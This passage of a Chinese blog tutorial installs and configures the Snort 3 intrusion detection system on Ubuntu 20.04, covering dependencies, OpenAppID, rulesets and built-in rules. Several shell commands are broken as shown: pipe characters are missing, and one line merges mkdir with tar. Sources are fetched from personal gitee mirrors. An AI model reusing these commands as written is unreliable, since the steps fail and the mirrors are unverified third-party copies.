href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/focal/ubuntu-20.04.4-desktop-amd64.iso">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/focal/ubuntu-20.04.4-desktop-amd64.iso</a>
具体安装过程参见：<a
href="https://zhuanlan.zhihu.com/p/355314438">https://zhuanlan.zhihu.com/p/355314438</a></p>
<h4 id="ubuntu安装vmware-tools">1.2 Ubuntu安装VMware Tools</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c63fafc8981.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c63fb5254ff.png" /></p>
<h4 id="ubuntu安装ssh服务">1.3 Ubuntu安装ssh服务</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装ssh服务端</span></span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line"><span class="comment">#确认sshserver是否启动了</span></span><br><span class="line">ps -e  grep ssh</span><br><span class="line"><span class="comment">#如果只有ssh-agent那ssh-server还没有启动，需要/etc/init.d/ssh start，如果看到sshd那说明ssh-server已经启动了</span></span><br><span class="line"><span class="comment">#启动sshserver</span></span><br><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure>
<h3 id="安装snort">2、安装Snort</h3>
<p>更新系统确保系统最新，并有最新的包列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y</span><br></pre></td></tr></table></figure>
<p>设置系统的时间和时区【Splunk处理警报时非常重要】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure>
<p>新建snort_src文件夹，存储下载的大量源文件压缩包和其他源文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/snort_src</span><br><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br></pre></td></tr></table></figure>
<p>安装Snort 3依赖包【详情参见Snort3手册】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y build-essential autotools-dev libdumbnet-dev \</span><br><span class="line">libluajit-5.1-dev libpcap-dev zlib1g-dev pkg-config libhwloc-dev \</span><br><span class="line">cmake</span><br></pre></td></tr></table></figure>
<p>同上【可选，但推荐安装】：</p>
<p>sudo apt-get install -y liblzma-dev openssl libssl-dev cpputest
libsqlite3-dev uuid-dev</p>
<p>因为是从github库中安装Snort，所以需要一些额外的工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y libtool git autoconf</span><br></pre></td></tr></table></figure>
<p>安装Snort DAQ【数据获取库】的依赖包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y bison flex libcmocka-dev</span><br></pre></td></tr></table></figure>
<p>如果需要使用NFQ (IPS模式)以内联模式运行Snort，则安装所需的包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y libnetfilter-queue-dev libmnl-dev</span><br></pre></td></tr></table></figure>
<p>下载和安装safec【用于对某些遗留C-library调用的运行时边界检查】，可选的，但推荐：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line"><span class="comment">#直接从github下载较慢，已被转存至gitee</span></span><br><span class="line">wget https://gitee.com/deng_wenyi/snort3-ubuntu-install-source-code/repository/archive/master.zip</span><br><span class="line">apt install unzip</span><br><span class="line">unzip master.zip</span><br><span class="line"><span class="built_in">mv</span> snort3-ubuntu-install-source-code/libsafec-08112019.0-gad76c7.tar.gz ./</span><br><span class="line">tar -xzvf libsafec-08112019.0-gad76c7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libsafec-08112019.0-gad76c7/</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>安装PCRE：Perl兼容正则表达式。不使用Ubuntu库，因为Ubuntu库的版本更老。没有使用pcre2，因为hyperscan无法与那个版本兼容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src/</span><br><span class="line"><span class="built_in">mv</span> snort3-ubuntu-install-source-code/pcre-8.43.tar.gz ./</span><br><span class="line">tar -xzvf pcre-8.43.tar.gz</span><br><span class="line"><span class="built_in">cd</span> pcre-8.43</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>下载并安装gperftools
2.7，谷歌的线程缓存malloc【用于chrome】。Tcmalloc是一个内存分配器，它针对高并发情况进行了优化，将提供更好的速度来平衡较高的内存使用。不从Ubuntu存储库中获得tcmalloc版本(2.5版本)，因为它与Snort不兼容。Tcmalloc是可选的，但建议：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y libunwind-dev</span><br><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line"><span class="built_in">mv</span> snort3-ubuntu-install-source-code/gperftools-2.7.90.tar.gz ./</span><br><span class="line">tar xzvf gperftools-2.7.90.tar.gz</span><br><span class="line"><span class="built_in">cd</span> gperftools-2.7.90</span><br><span class="line">./configure</span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>Snort
3使用Hyperscan实现快速模式匹配。Hyperscan需要Ragel和Boost头：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line"><span class="built_in">mv</span> snort3-ubuntu-install-source-code/ragel-6.10.tar.gz ./</span><br><span class="line">tar -xzvf ragel-6.10.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ragel-6.10</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>Hyperscan需要Boost
c++库。请注意，没有使用boost头文件的Ubuntu存储库版本(libboost-all-dev)，因为Hyperscan需要1.58或更高版本的boost库，而且Ubuntu存储库版本太老了。下载Boost
1.72.0库，但不安装【后面直接引用】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line"><span class="comment">#boost库比较大（约120M），见百度网盘下载；</span></span><br><span class="line"><span class="comment">#链接： https://pan.baidu.com/s/1GOM1KXJDjBMsElGw7q3fRg  密码: e4av</span></span><br><span class="line">tar -xvzf boost_1_72_0.tar.gz</span><br></pre></td></tr></table></figure>
<p>从源文件安装hyperscan5.2.1，引用Boost头文件源目录的位置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line"><span class="built_in">mv</span> snort3-ubuntu-install-source-code/hyperscan-5.2.1.tar.gz ./</span><br><span class="line">tar -xvzf hyperscan-5.2.1.tar.gz</span><br><span class="line"><span class="built_in">mkdir</span> ~/snort_src/hyperscan-5.2.1-build</span><br><span class="line"><span class="built_in">cd</span> hyperscan-5.2.1-build/</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr/local -DBOOST_ROOT=~/snort_src/boost_1_72_0/ ../hyperscan-5.2.1</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>如果想测试Hyperscan工作，可以从构建目录运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src/hyperscan-5.2.1-build/</span><br><span class="line">./bin/unit-hyperscan</span><br></pre></td></tr></table></figure>
<p>Snort对flatbuffers有一个可选的要求，这是一个内存高效的序列化库【可以在cmake过程中忽略“不是git库”的错误】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line"><span class="built_in">mv</span> snort3-ubuntu-install-source-code/flatbuffers-v1.12.0.tar.gz ./</span><br><span class="line">tar -xzvf flatbuffers-v1.12.0.tar.gz</span><br><span class="line"><span class="built_in">mkdir</span> flatbuffers-build</span><br><span class="line"><span class="built_in">cd</span> flatbuffers-build</span><br><span class="line">cmake ../flatbuffers-1.12.0</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>接下来，从Snort网站下载并安装数据采集库(DAQ)。注意，Snort
3使用的DAQ与Snort 2.9.x.x系列不同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/deng_wenyi/snort3-libdaq.git</span><br><span class="line"><span class="built_in">cd</span> snort3-libdaq</span><br><span class="line">./bootstrap</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>更新共享库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<p>现在，准备从github存储库下载、编译和安装Snort
3。如果对启用额外的编译时功能感兴趣，比如能够处理大的(超过2 GB)
PCAP文件，或者新的命令行shell，那么应该运行./configure cmake.sh
--help列出所有可能的选项。下载和安装，默认设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src</span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/deng_wenyi/snortadmin-snort3.git</span><br><span class="line"><span class="built_in">cd</span> snortadmin-snort3/</span><br><span class="line">./configure_cmake.sh --prefix=/usr/local --enable-tcmalloc</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>安装的最后一步是验证Snort是否安装并可以运行。为此，向snort可执行文件传递-V这个标志：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/local/bin/snort -V</span><br></pre></td></tr></table></figure>
<p>应该会看到类似如下的输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c640362a669.png" /></p>
<p>如果的输出与上面的类似，那么Snort已安装并正常工作。使用默认配置文件测试Snort：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>应该会看到以以下内容结束的输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6403b6f313.png" /></p>
<h3 id="配置网卡">3、配置网卡</h3>
<p>现代网卡使用卸载(例如LRO)来处理硬件中的网络包重新组装，而不是在软件中重新组装。对于大多数情况，这是首选的，因为它减少了系统上的负载。对于NIDS，希望禁用LRO和GRO，因为这会截断较长的数据包(更多信息请参见Snort
2手册)。
需要创建一个systemD服务来更改这些设置。首先确定使用ifconfig查看让snort侦听的接口的名称。
注意：如果使用的是Ubuntu 20：ifconfig已经被ip命令所取代【运行ip address
show查看接口和ip地址】。
一旦知道了网络接口的名称，请检查这些接口的大接收(LRO)和通用接收(GRO)的卸载状态。在下面的示例中，我的接口名称是ens33。
安装ethtool，使用ethtool来检查LRO/GRO的状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ethtool -k ens33  grep receive-offload</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c642d973c02.png" /></p>
<p>从这个输出中，可以看到启用了GRO，LRO被禁用(“固定”意味着它不能被改变)。需要确保两者都被设置为"off"(或off
[fixed])。可以使用ethtool命令禁用LRO和GRO，但该设置不会在重新启动时持久存在。解决方案是创建一个systemD脚本，在每次引导时自动设置这个值。
创建systemD脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /lib/systemd/system/ethtool.service</span><br></pre></td></tr></table></figure>
<p>输入以下信息【注，将ens33替换为自己的接口名称】：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Ethtool Configration <span class="keyword">for</span> Network Interface</span><br><span class="line">[Service]</span><br><span class="line">Requires=network.target</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/sbin/ethtool -K ens33 gro off</span><br><span class="line">ExecStart=/sbin/ethtool -K ens33 lro off</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c642f0ec69d.png" /></p>
<p>文件创建完成后，启用服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> ethtool</span><br><span class="line">sudo service ethtool start</span><br></pre></td></tr></table></figure>
<p>这些设置现在将在重新引导时持久存在。可以使用ethtool验证设置，将显示(off或off[fixed]是想要看到的设置)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ethtool -k ens33  grep receive-offload</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c642f751e53.png" /></p>
<h3 id="安装openappld">4、安装OpenApplD</h3>
<p>OpenApplD允许识别应用层(第7层)的流量。可以创建操作应用程序层流量的规则(比如阻止baidu)，并记录检测到的每种类型的流量统计数据。
在社区的帮助下，Snort团队创建了一个检测器包，称为应用程序检测器包，可以下载和安装。首先下载OpenAppID检测器包并解压缩文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src/</span><br><span class="line">wget https://snort.org/downloads/openappid/23020</span><br><span class="line"><span class="built_in">mv</span> 23020 23020.tar.gz</span><br><span class="line">tar -xzvf 23020.tar.gz</span><br><span class="line">sudo <span class="built_in">cp</span> -R odp /usr/local/lib/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64370a097f.png" /></p>
<p>如果得到的错误是该文件不存在，那么可能是Snort团队更新了规则集。浏览到https://snort.org/downloads#openappid，并下载snort-openappid.tar.gz。
按照上面的方法下载和提取规则后，需要编辑Snort配置文件以指向这个odp目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/local/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>编辑"appid
="条目。添加app_detector_dir选项，让它指向上面解压缩的odp文件夹的父文件夹。如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appid =</span><br><span class="line">&#123;</span><br><span class="line">    −− appid requires this to use appids <span class="keyword">in</span> rules</span><br><span class="line">    app_detector_dir = <span class="string">&#x27;/usr/local/lib&#x27;</span>,</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>注意，缩进行必须有四个空格，而不是制表符。测试配置文件能否正确加载：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua --warn-all</span><br></pre></td></tr></table></figure>
<p>此命令将验证Snort是否可以正确读取snort.lua文件，它不包含任何错误。运行此命令后，应该看到以以下内容结束的输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c643b8473e8.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c643bd6b7eb.png" /></p>
<p>上图报的错忽略即可，只要输出以“Snort成功验证了配置”结束，就可以忽略此警告。这个警告只是意味着没有任何本地开发的openAppld获取脚本。
注：Snort的异常等级，警告、错误、致命错误。
接下来，将创建一个简单的规则来测试OpenAppID是否正常工作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/etc/rules</span><br><span class="line">sudo <span class="built_in">touch</span> /usr/local/etc/rules/local.rules</span><br><span class="line">sudo vim /usr/local/etc/rules/local.rules</span><br></pre></td></tr></table></figure>
<p>将在local.rules文件中生成两个规则。第一个规则使用OpenApplID来检查Baidu流量，第二个规则将检测ICMP流量，这对于测试警报是否正确生成非常有用。这两条规则很适合测试的设置。将以下两行粘贴到上面创建的local.rules文件中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; any any ( msg:<span class="string">&quot;Baidu Detected&quot;</span>; appids:<span class="string">&quot;Baidu&quot;</span>;sid:10000001; )</span><br><span class="line">alert icmp any any -&gt; any any (msg:<span class="string">&quot;ICMP Traffic Detected&quot;</span>;sid:10000002;)</span><br></pre></td></tr></table></figure>
<p>现在运行Snort并加载local.rules文件，以确保正确加载这些规则(验证规则的格式正确)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua  -R /usr/local/etc/rules/local.rules</span><br></pre></td></tr></table></figure>
<p>输出应该以“Snort成功验证了匹配”结束。不应该有任何警告或错误【除上面那个错误】。
如果向上滚动输出，应该会看到这两个文本规则已成功加载(在rule
counts部分)。现在，让在一个接口上以检测模式运行snort，并将所有警报打印到控制台：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules  -i ens33 -A alert_fast -s 65535 -k none</span><br></pre></td></tr></table></figure>
<p>"-k none"标志告诉Snort忽略错误的校验和，正常处理，而"-s
65535"标志则防止Snort处理过大的包。Stream和Frag解码器会丢弃校验和错误的数据包，而OpenApplD检测器也不会处理这些数据包。通过包含这些标志，可以确保具有错误校验和的数据包仍然被处理为警报。snort将加载配置，然后显示：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64425aeee9.png" /></p>
<p>这意味着snort目前正在监听该接口上的所有流量，并将其与它加载的两个规则进行比较。当流量与规则匹配时，snort将向控制台写入警告。在另一个终端窗口ping另一IP并使用wget连接到baidu。这将触发规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget baidu.com</span><br></pre></td></tr></table></figure>
<p>在第一个控制台窗口中，将看到类似于以下的警报输出：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6442bf3c64.png" /></p>
<p>使用ctrl-c停止Snort，如果无法使用ctrl-c停止Snort，可以尝试ctrl-z。
如果没有看到生成的警报，请确保在此测试中，正在运行snort的计算机上运行wget
baidu.com，并且请求将从snort侦听的接口发出。可以从另一台计算机ping到snort(到让snort侦听的接口的ip地址)。
如果希望收集OpenAppID统计信息【每个检测器检测到多少流量】，则需要在snort.lua文件中启用它，并使用"-l"标志，在标志后接"日志目录"运行Snort。
首先创建一个日志目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /var/log/snort</span><br></pre></td></tr></table></figure>
<p>现在修改/usr/local/etc/snort/snort.lua使appid检测器能够记录统计信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appid =</span><br><span class="line">&#123;</span><br><span class="line">    app_detector_dir = <span class="string">&#x27;/usr/local/lib&#x27;</span>,</span><br><span class="line">    log_stats = <span class="literal">true</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在运行snort，监听接口，将数据记录到/var/log/snort文件夹(与之前的命令相同，只是添加了日志文件夹路径"-l"标志)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules  -i ens33 -A alert_fast -s 65535 -k none -l /var/log/snort</span><br></pre></td></tr></table></figure>
<p>在收集一些数据并停止Snort【和前面一样使用ping和wget
baidu.com生成数据，然后使用Ctrl-C停止】之后，将在/var/log/snort看到appid_stats.log该文件为root用户所有，为让所有人都可读，更改Snort自动编写的文件的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> a+r /var/log/snort/appid_stats.log</span><br></pre></td></tr></table></figure>
<p>现在可以查看snort收集的协议统计信息：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64467a9d42.png" /></p>
<p>这是一个逗号分隔的文件，按照这个顺序显示时间(unixtime)、检测器、发送字节(tx)和接收字节(rx)。如果不希望收集此数据，可以在snort.lua配置文件appid模块中禁用log开启选项。请注意，此数据与local.rules文件中由规则生成的警报不同。有关检测器的更多信息，请参见OpenApplD检测器指南。</p>
<h3 id="安装snort规则集">5、安装Snort规则集</h3>
<p>与Snort 2规则相比，Snort
3规则有更多的选项，尽管手动下载的v2规则或使用PulledPork【一个自动下载更新规则集的脚本】可以在Snort
3中使用，但应该使用专门为Snort
3创建的规则。另外目前PulledPork还不能与Snort
3一起工作，因此无法自动更新规则集。
有三组不同的Snort规则可供选择。社区规则集是免费的，不需要登录；注册的规则集包含社区规则集和其他规则，需要在snort.org上拥有一个免费帐户。订阅者规则集是付费服务。订阅方规则集的规则将在30天后添加到注册的规则集。
以下使用注册的规则集。需要在Snort.org上创建一个帐户，还可以选择在其中注册各种snort邮件列表。注册并签到之后，导航到规则下载页面，下载最新的3.0规则(称为snortrales-snapshot3xxx.tar.gz或类似的内容，取决于是否发布了新的版本)。将规则集保存到snort-src文件夹中。
注意，规则集单独到官网下，wget方式下载的文件解压不了【注册账号登录，在网站直接点下载链接，将下载的文件在复制到虚拟机】。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c644da8e133.png" /></p>
<p>需要创建一些文件夹来存储规则集中的规则。这里在usr/local/etc/snort中创建了四个文件夹;</p>
<p>文件夹名称</p>
<p>目的</p>
<p>rules</p>
<p>注册规则集中的所有基本规则文件</p>
<p>builtin_rules</p>
<p>包含内置规则的引用和信息的规则文件</p>
<p>so_rules</p>
<p>这些是编译后的规则</p>
<p>Lists</p>
<p>白名单和黑名单</p>
<p>创建这些文件夹：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/etc/rules</span><br><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/etc/builtin_rules</span><br><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/etc/so_rules</span><br><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/etc/lists</span><br></pre></td></tr></table></figure>
<p>Snort的规则集包含三个文件夹：一个规则文件夹包含所有单独的规则文件，一个内建文件夹包含关于构建到snort的规则的信息，以及一个etc文件夹，其中包含规则集生成的更新后的snort配置文件。从Snort的规则集中提取文件，将所有规则文件复制到snort规则文件夹中，将内置规则复制到内置文件夹中，并将snort配置文件复制到snort的程序文件夹中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/snort_src/</span><br><span class="line"><span class="built_in">mkdir</span> snortrules-3034tar -xvzf snortrules-snapshot-3034.tar.gz  -C ./snortrules-3034</span><br><span class="line"><span class="built_in">cd</span> snortrules-3034</span><br><span class="line"><span class="comment">#复制单个规则文件</span></span><br><span class="line">sudo <span class="built_in">cp</span> ./rules/*.rules /usr/local/etc/rules/</span><br><span class="line"><span class="comment">#复制内建规则文件</span></span><br><span class="line">sudo <span class="built_in">cp</span> ./builtins/builtins.rules /usr/local/etc/builtin_rules/</span><br><span class="line"><span class="comment">#复制新的配置文件(将覆盖当前的配置)。</span></span><br><span class="line">sudo <span class="built_in">cp</span> ./etc/* /usr/local/etc/snort/</span><br></pre></td></tr></table></figure>
<p>从etc文件夹复制了三个文件。file_magic.lua它告诉snort如何识别文件类型；snort_defaults.lua表示配置snort的全局设置(系统范围)；snort.lua它是snort特定实例的配置文件。每次运行Snort时，将向Snort传递一个snort.lua文件，该文件描述希望snort如何运行。这个文件会加载默认文件，它描述的系统配置,适用于每个不同方式运行snort。可以有多个不同版本的snort.lua,但通常只有一个默认的配置。现在编辑这些文件。不需要对/usr/local/etc/snort/snort_defaults.lua进行任何更改。接下来，编辑snort.lua文件。这个文件是在启动时传递给snort的配置文件，它还加载snort_defaults.lua文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/local/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>首先，配置的HOME_NET变量。这指的是正在保护的本地子网，规则使用此信息来确定警报是否匹配。在这里设置的本地子网信息以匹配的子网。我的子网配置是10.10.10.0网络与24位子网掩码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOME_NET = <span class="string">&#x27;10.10.10.0/24&#x27;</span></span><br></pre></td></tr></table></figure>
<p>设置EXTERNAL_NET为“any”，注，如果设置这个为除了所有子网的主网，会错过许多重要的警告。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6467df162b.png" /></p>
<p>配置appid插件【操作同前】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6468275219.png" /></p>
<p>分析ips检测器。查看IPS设置，可以看到复制的所有规则文件：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6468b1ab57.png" /></p>
<p>$RULE_PATH路径在snort_defaults.lua中定义，引用/usr/local/etc/rules。也可以看到内置ips选项；稍后将启用这些规则。现在，测试一下snort是否可以成功加载这些规则。让通过运行snort来测试配置文件，并将路径传递给这个修改后的snort.lua文件，就像之前做的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>如果你出现了类似以下报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Finished /usr/local/etc/snort/snort.lua:</span><br><span class="line">Loading ips.rules:</span><br><span class="line">FATAL: ips.rules:3 undefined variable name: RULE_PATH.</span><br><span class="line">Fatal Error, Quitting..</span><br></pre></td></tr></table></figure>
<p>参见：</p>
<p><a
href="https://www.cnblogs.com/Deng-Xian-Sheng/p/14170498.html">https://www.cnblogs.com/Deng-Xian-Sheng/p/14170498.html</a>解决报错。</p>
<p>正常输出可看到规则被加载：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c646b5910dd.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c646c7cbbf3.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c646cd7093b.png" /></p>
<p>注意：规则集中的许多规则都被注释掉了。主要原因是有些规则可能会产生误报，所以Snort团队已经注释掉了这些规则，因为如果在NIPS模式下运行Snort，它们可能会淹没的日志，或导致过多的流量中断。
使用以下标志来运行Snort，以便在测试和设置期间检测问题：warn-all和pedantic标志。Snort
3手册：</p>
<p>除非指定了–warn-*，否则不会发出警告。-warn-all 启用所有警告，而
– pedantic会使这些警告致命</p>
<p>在运行Snort时，不会希望使用–pedantic标志，因为简单的flowbit警告【设置了flowbits，但没有在规则中使用，这是一个常见问题】将生成警告并导致Snort出错。不过，对于测试配置来说，这是一个很好的标志。</p>
<h3 id="启用内置规则">6、启用内置规则</h3>
<p>要启用“启用解码器”和“检查器”警报【这些警报检测无法通过常规规则轻松检测到的恶意流量】，需要在snort配置文件中启用这个选项：snort.lua，位于/usr/local/etc/snort/目录中。另外，需要加载builtins.rules规则，这些规则包含每个警告的详细信息，并将这些信息写入控制台，编辑snort.lua：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="keyword">local</span>/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>通过删除行首的两个连字符，将enable_builtin_rules设置为true。以两个连字符开头的行是注释【禁用的命令通常注释，并且在加载时不会被snort解析】。删除enable_builtin_rules前的两个连字符来启用这个选项。
为包含内置规则文件，因此将其作为一个include添加到规则数组中。需要在内置文件夹中引用这个文件如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">include $BUILTIN_RULE_PATH/builtins.rules</span><br></pre></td></tr></table></figure>
<p>注意，snort中的每个缩进snort.lua必须是四个空格(不是制表符)，否则配置将无法加载。
snort.lua中ips模块配置结果：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c64707b7b4a.png" /></p>
<p>现在测试对snort.lua配置文件的更改是否有错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snort -c /usr/local/etc/snort/snort.lua</span><br></pre></td></tr></table></figure>
<p>向上滚动前面命令的输出，应该看到除了加载其他规则外，还加载了内置规则。也可以向上滚动，查看IPS
模块已加载的所有规则文件。这里你可以看到一些已加载的规则文件，以及616条加载的bultin规则：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6470de7c16.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c6472a44cd9.png" /></p>
